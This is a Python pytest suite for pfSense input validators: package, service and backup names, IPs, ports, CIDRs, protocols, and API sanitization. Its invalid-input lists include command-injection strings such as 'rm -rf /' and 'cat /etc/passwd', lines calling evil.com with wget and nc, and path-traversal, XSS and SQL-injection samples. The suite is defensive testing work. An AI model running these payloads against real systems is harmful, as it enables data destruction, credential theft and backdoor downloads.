"""Tests for pfSense validation utilities."""

import pytest
from src.utils.validation import (
    validate_package_name,
    validate_service_name,
    validate_backup_name,
    validate_id,
    validate_ip_address,
    validate_port,
    validate_vlan_id,
    validate_cidr,
    validate_ip_or_cidr,
    validate_port_range,
    validate_protocol,
    sanitize_for_api
)


class TestPackageNameValidation:
    """Test package name validation."""
    
    def test_valid_package_names(self):
        """Test valid package names."""
        valid_names = [
            "pfSense-pkg-haproxy",
            "openvpn-client-export",
            "snort",
            "suricata",
            "wireguard",
            "package-1.0",
            "test_package",
            "my-package.tar"
        ]
        
        for name in valid_names:
            assert validate_package_name(name) is True, f"Expected '{name}' to be valid"
    
    def test_invalid_package_names(self):
        """Test invalid package names with injection attempts."""
        invalid_names = [
            "",  # Empty
            None,  # None
            123,  # Not a string
            "package; rm -rf /",  # Command injection
            "package && wget evil.com/backdoor.sh",  # Command injection
            "package | cat /etc/passwd",  # Command injection
            "package`whoami`",  # Command injection
            "package$((1+1))",  # Command injection
            "../../../etc/passwd",  # Path traversal
            "package<script>alert(1)</script>",  # XSS attempt
            "package'OR'1'='1",  # SQL injection pattern
            "a" * 300,  # Too long
        ]
        
        for name in invalid_names:
            assert validate_package_name(name) is False, f"Expected '{name}' to be invalid"


class TestServiceNameValidation:
    """Test service name validation."""
    
    def test_valid_service_names(self):
        """Test valid service names."""
        valid_names = [
            "openvpn",
            "ipsec",
            "wireguard",
            "haproxy",
            "snort",
            "suricata",
            "nginx",
            "my-service",
            "test_service"
        ]
        
        for name in valid_names:
            assert validate_service_name(name) is True, f"Expected '{name}' to be valid"
    
    def test_invalid_service_names(self):
        """Test invalid service names with injection attempts."""
        invalid_names = [
            "",  # Empty
            None,  # None
            123,  # Not a string
            "service; reboot",  # Command injection
            "service && rm -rf /",  # Command injection
            "service | nc evil.com 1234",  # Command injection
            "service`id`",  # Command injection
            "service$(cat /etc/passwd)",  # Command injection
            "../../../etc/init.d/evil",  # Path traversal
            "service.with.dots",  # Dots not allowed in service names
            "a" * 150,  # Too long
        ]
        
        for name in invalid_names:
            assert validate_service_name(name) is False, f"Expected '{name}' to be invalid"


class TestBackupNameValidation:
    """Test backup name validation."""
    
    def test_valid_backup_names(self):
        """Test valid backup names."""
        valid_names = [
            "backup-2024-01-01",
            "config.xml",
            "my_backup.tar.gz",
            "backup-v1.0.0",
            "test-backup",
            "backup_20240101"
        ]
        
        for name in valid_names:
            assert validate_backup_name(name) is True, f"Expected '{name}' to be valid"
    
    def test_invalid_backup_names(self):
        """Test invalid backup names with injection attempts."""
        invalid_names = [
            "",  # Empty
            None,  # None
            123,  # Not a string
            "backup; rm backup.xml",  # Command injection
            "backup && cat /etc/passwd",  # Command injection
            "backup | mail attacker@evil.com",  # Command injection
            "backup`whoami`",  # Command injection
            "../../../etc/passwd",  # Path traversal
            "backup/../../../important.xml",  # Path traversal
            "a" * 300,  # Too long
        ]
        
        for name in invalid_names:
            assert validate_backup_name(name) is False, f"Expected '{name}' to be invalid"


class TestIdValidation:
    """Test ID validation."""
    
    def test_valid_ids(self):
        """Test valid IDs."""
        valid_ids = [
            "rule-123",
            "vlan-100",
            "interface_wan",
            "fw-rule-1",
            "NAT-1",
            "test_id"
        ]
        
        for id_val in valid_ids:
            assert validate_id(id_val) is True, f"Expected '{id_val}' to be valid"
    
    def test_invalid_ids(self):
        """Test invalid IDs with injection attempts."""
        invalid_ids = [
            "",  # Empty
            None,  # None
            123,  # Not a string
            "id; rm -rf /",  # Command injection
            "id && reboot",  # Command injection
            "id | cat /etc/passwd",  # Command injection
            "id`whoami`",  # Command injection
            "../../../etc/passwd",  # Path traversal
            "id/../../important",  # Path traversal
            "id with spaces",  # Spaces not allowed
            "id.with.too.many.dots.for.safety",  # Dots allowed but validate length
            "a" * 150,  # Too long
        ]
        
        for id_val in invalid_ids:
            assert validate_id(id_val) is False, f"Expected '{id_val}' to be invalid"


class TestIPAddressValidation:
    """Test IP address validation."""
    
    def test_valid_ip_addresses(self):
        """Test valid IP addresses."""
        valid_ips = [
            "192.168.1.1",
            "10.0.0.1",
            "172.16.0.1",
            "8.8.8.8",
            "255.255.255.255",
            "0.0.0.0",
            "::1",
            "2001:0db8:85a3::8a2e:0370:7334"
        ]
        
        for ip in valid_ips:
            assert validate_ip_address(ip) is True, f"Expected '{ip}' to be valid"
    
    def test_invalid_ip_addresses(self):
        """Test invalid IP addresses."""
        invalid_ips = [
            "",
            "256.256.256.256",
            "192.168.1",
            "192.168.1.1.1",
            "not-an-ip",
            "192.168.1.1; rm -rf /",
            "192.168.1.1 && reboot"
        ]
        
        for ip in invalid_ips:
            assert validate_ip_address(ip) is False, f"Expected '{ip}' to be invalid"


class TestPortValidation:
    """Test port validation."""
    
    def test_valid_ports(self):
        """Test valid ports."""
        valid_ports = [1, 80, 443, 8080, 65535, "80", "443"]
        
        for port in valid_ports:
            assert validate_port(port) is True, f"Expected port '{port}' to be valid"
    
    def test_invalid_ports(self):
        """Test invalid ports."""
        invalid_ports = [0, 65536, -1, 99999, "not-a-port", "", None]
        
        for port in invalid_ports:
            assert validate_port(port) is False, f"Expected port '{port}' to be invalid"


class TestVLANIDValidation:
    """Test VLAN ID validation."""
    
    def test_valid_vlan_ids(self):
        """Test valid VLAN IDs."""
        valid_ids = [1, 100, 4094, "1", "100", "4094"]
        
        for vlan_id in valid_ids:
            assert validate_vlan_id(vlan_id) is True, f"Expected VLAN ID '{vlan_id}' to be valid"
    
    def test_invalid_vlan_ids(self):
        """Test invalid VLAN IDs."""
        invalid_ids = [0, 4095, -1, 10000, "not-a-vlan", "", None]
        
        for vlan_id in invalid_ids:
            assert validate_vlan_id(vlan_id) is False, f"Expected VLAN ID '{vlan_id}' to be invalid"


class TestCIDRValidation:
    """Test CIDR notation validation."""
    
    def test_valid_cidr(self):
        """Test valid CIDR notations."""
        valid_cidrs = [
            "192.168.1.0/24",
            "10.0.0.0/8",
            "172.16.0.0/12",
            "192.168.1.1/32",
            "0.0.0.0/0",
            "2001:db8::/32",
            "fe80::/10"
        ]
        
        for cidr in valid_cidrs:
            assert validate_cidr(cidr) is True, f"Expected CIDR '{cidr}' to be valid"
    
    def test_invalid_cidr(self):
        """Test invalid CIDR notations."""
        invalid_cidrs = [
            "",
            "192.168.1.0/",  # Missing prefix length
            "192.168.1.0/33",  # Invalid prefix length
            "256.256.256.0/24",  # Invalid IP
            "192.168.1.0/24; rm -rf /",  # Injection attempt
            None
        ]
        
        for cidr in invalid_cidrs:
            assert validate_cidr(cidr) is False, f"Expected CIDR '{cidr}' to be invalid"


class TestIPOrCIDRValidation:
    """Test combined IP/CIDR validation."""
    
    def test_valid_ip_or_cidr(self):
        """Test valid IPs and CIDRs."""
        valid_values = [
            "192.168.1.1",
            "192.168.1.0/24",
            "10.0.0.0/8",
            "::1",
            "2001:db8::/32"
        ]
        
        for value in valid_values:
            assert validate_ip_or_cidr(value) is True, f"Expected '{value}' to be valid"
    
    def test_invalid_ip_or_cidr(self):
        """Test invalid values."""
        invalid_values = [
            "",
            "not-an-ip",
            "192.168.1.0/33",
            "256.256.256.0/24",
            None
        ]
        
        for value in invalid_values:
            assert validate_ip_or_cidr(value) is False, f"Expected '{value}' to be invalid"


class TestPortRangeValidation:
    """Test port range validation."""
    
    def test_valid_single_ports(self):
        """Test valid single ports."""
        valid_ports = ["80", "443", "8080", "1", "65535"]
        
        for port in valid_ports:
            assert validate_port_range(port) is True, f"Expected port '{port}' to be valid"
    
    def test_valid_port_ranges(self):
        """Test valid port ranges."""
        valid_ranges = [
            "8000-9000",
            "1-65535",
            "80-443",
            "1000-2000"
        ]
        
        for port_range in valid_ranges:
            assert validate_port_range(port_range) is True, f"Expected port range '{port_range}' to be valid"
    
    def test_invalid_port_ranges(self):
        """Test invalid port ranges."""
        invalid_ranges = [
            "",
            "0",
            "65536",
            "9000-8000",  # Reversed range
            "80-",  # Missing end
            "-80",  # Missing start
            "80-443-8080",  # Too many parts
            "80; rm -rf /",  # Injection attempt
            None
        ]
        
        for port_range in invalid_ranges:
            assert validate_port_range(port_range) is False, f"Expected port range '{port_range}' to be invalid"


class TestProtocolValidation:
    """Test protocol validation."""
    
    def test_valid_protocols(self):
        """Test valid protocols."""
        valid_protocols = [
            "tcp",
            "udp",
            "icmp",
            "esp",
            "ah",
            "gre",
            "any",
            "tcp/udp",
            "TCP",  # Case insensitive
            "UDP"
        ]
        
        for protocol in valid_protocols:
            assert validate_protocol(protocol) is True, f"Expected protocol '{protocol}' to be valid"
    
    def test_invalid_protocols(self):
        """Test invalid protocols."""
        invalid_protocols = [
            "",
            None,
            123,
            "invalid",
            "tcp; rm -rf /",  # Injection attempt
            "tcp && reboot",  # Injection attempt
            "tcp | cat /etc/passwd",  # Injection attempt
            "tcp`whoami`",  # Injection attempt
            "tcp$(id)",  # Injection attempt
            "tcp<script>",  # XSS attempt
        ]
        
        for protocol in invalid_protocols:
            assert validate_protocol(protocol) is False, f"Expected protocol '{protocol}' to be invalid"


class TestSanitizeForAPI:
    """Test API input sanitization."""
    
    def test_remove_dangerous_characters(self):
        """Test removal of dangerous characters."""
        test_cases = [
            ("normal text", "normal text"),
            ("text<script>alert(1)</script>", "textalert(1)"),
            ("text; rm -rf /", "text rm -rf "),
            ("text && reboot", "text  reboot"),
            ("text | cat /etc/passwd", "text  cat etcpasswd"),
            ("text`whoami`", "textwhoami"),
            ("text$(id)", "textid"),
        ]
        
        for input_val, expected in test_cases:
            result = sanitize_for_api(input_val)
            # Check that dangerous chars are removed
            assert '<' not in result
            assert '>' not in result
            assert ';' not in result
            assert '|' not in result
            assert '`' not in result
            assert '$' not in result
            assert '(' not in result
            assert ')' not in result
    
    def test_handle_edge_cases(self):
        """Test edge cases."""
        assert sanitize_for_api("") == ""
        assert sanitize_for_api(None) == ""
        assert sanitize_for_api("   spaces   ") != ""  # Should strip


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
